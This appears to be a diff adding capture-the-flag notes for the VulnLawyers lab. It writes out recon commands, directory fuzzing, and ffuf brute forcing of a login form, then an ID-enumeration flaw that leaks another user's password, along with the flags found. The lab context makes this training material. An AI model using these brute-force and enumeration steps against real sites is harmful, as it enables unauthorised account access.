@@ -1,0 +1,123 @@
+Domain: www.vulnlawyers.co.uk
+
+Ip: 68.183.255.206
+
+"Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+
+server: nginx/1.21.1
+
+
+
+get url:
+
+curl  http://www.vulnlawyers.co.uk  -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+
+// ipv4 address to use for dns request: --dns-ipv4-addr
+
+
+
+nslookup:
+
+nslookup -type=any www.vulnlawyers.co.uk 8.8.8.8
+
+//Ip found - 68.183.255.206
+
+
+
+dnsrecon:
+
+dnsrecon -d vulnlawyers.co.uk -D ~/wordlist/subdomains.txt -t brt
+
+//Subdomains found: data.vulnlawyers.co.uk
+
+{"name":"VulnLawyers Website API","version":"2.1.04","flag":"[^FLAG^E78DEBBFDFBEAFF1336B599B0724A530^FLAG^]"}
+
+//#1 FLAG found
+
+
+
+Contents discovery for domain:
+
+ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://vulnlawyers.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+
+//directories found: css, denied, images, js, login, 
+
+//trying to get access...
+
+
+
+-----/denied-----
+
+Access is denied from your ip address.
+
+
+
+-----/images-----
+
+301 Moved Permanently
+
+
+
+-----/login------
+
+curl  http://www.vulnlawyers.co.uk /login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+
+//#2 FLAG found
+
+Access to this portal can now be found here <a href=/lawyers-only"
+
+
+
+-----/lawyers-only-login-------
+
+//form site with email and password. Proceeds with bruteforcing.
+
+payload: email=email&password=password
+
+heather: Invalid Email/Password combination
+
+Content type: application/x-www-form-urlencoded
+
+
+
+ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/passwords.txt -d "email=admin@vulnlawyers.com&password=FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
+
+
+
+//Multiple option:
+
+ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/usernames.txt:FUZZ1 -w ~/wordlists/passwords.txt:FUZZ2 -d "email=FUZZ1@&vulnlawyers.co.uk&password=FUZZ2" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
+
+
+
+----------------------------------
+
+Contents discovery for subdomain:
+
+ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "data.vulnlawyers.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result.txt
+//contents found: users
+curl  http://data.vulnlawyers.co.uk/users -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+{"users":[{"name":"Yusef Mcclain","email":"yusef.mcclain@vulnlawyers.co.uk"},{"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk"},{"name":"Eisa Evans","email":"eisa.evans@vulnlawyers.co.uk"},{"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.co.uk"},{"name":"Marsha Blankenship","email":"marsha.blankenship@vulnlawyers.co.uk"}],"flag":"[^FLAG^25032EB0D322F7330182507FBAA1A55F^FLAG^]"}
+//#3 FLAG Found
+
+-----------------------------------
+
+//Fuzzing all users with ffuf. Found password for Jaskaran Lowe. Password: summer.
+ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/passwords.txt -d "email=jaskaran.lowe@vulnlawyers.co.uk@vulnlawyers.com&password=FUZZ" -t 1 -p 0.1 -mc all -fc 404 -o result -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Email/Password combination"
+//#4 Flag Found
+
+-----------------------------------
+
+//Inspecting http://vulnlawyers.co.uk/lawyers-only-profile
+//Page Response: {"id":4,"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.co.uk","password":"summer"}
+//Accessing users by id:
+//http://vulnlawyers.co.uk/lawyers-only-profile-details/2
+//Result: {"id":2,"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk","password":"q2V944&#2a1^3p","flag":"[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]"}
+//#5 FLAG Found
+
+-----------------------------------
+//Accessing the page as admin with credentials:
+//email: shayne.cairns@vulnlawyers.co.uk
+//password: q2V944&#2a1^3p
+//Deleting case...
+//#6 FLAG Found
